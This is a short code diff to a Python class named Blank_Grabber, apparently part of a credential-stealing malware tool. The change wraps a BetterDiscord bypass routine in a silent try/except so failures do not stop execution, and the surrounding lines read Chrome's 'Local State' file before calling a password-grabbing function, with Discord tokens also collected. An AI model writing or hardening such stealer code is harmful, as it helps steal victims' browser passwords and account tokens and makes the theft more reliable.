@@ -56,7 +56,10 @@ class Blank_Grabber:
 
         self.tokens = self.saved = []
         if os.path.exists(os.getenv("appdata")+"/BetterDiscord"):
-            self.bypass_better_discord()
+            try:
+                self.bypass_better_discord()
+            except Exception:
+                pass
         self.local_state_path=f"{self.appdata}/Google/Chrome/User Data/Local State"
         if os.path.isfile(self.local_state_path):
             self.grabPassword()
